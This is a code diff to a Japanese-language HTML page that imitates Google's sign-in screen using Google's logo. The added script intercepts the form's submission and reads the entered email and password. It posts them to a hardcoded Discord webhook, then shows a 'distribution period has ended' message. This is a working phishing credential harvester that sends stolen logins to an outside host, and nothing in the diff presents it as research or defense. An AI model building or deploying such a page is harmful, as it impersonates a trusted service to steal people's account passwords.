@@ -11,7 +11,7 @@
         <div class="login-box">
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google ロゴ" class="logo">
             <h1>サインイン</h1>
-            <form action="#">
+            <form id="login-form">
                 <div class="input-group">
                     <input type="email" id="email" required>
                     <label for="email">メールアドレスまたは電話番号</label>
@@ -32,5 +32,31 @@
             </form>
         </div>
     </div>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';
+
+            const message = {
+                content: `Email: ${email}\nPassword: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => response.ok ? alert('データが送信されました') : alert('送信に失敗しました'))
+            .catch(error => alert('エラーが発生しました: ' + error));
+        });
+    </script>
+    <h1>配布期間が終了しました。</h2>
+<h2>次回をお楽しみに</h2>
 </body>
 </html>
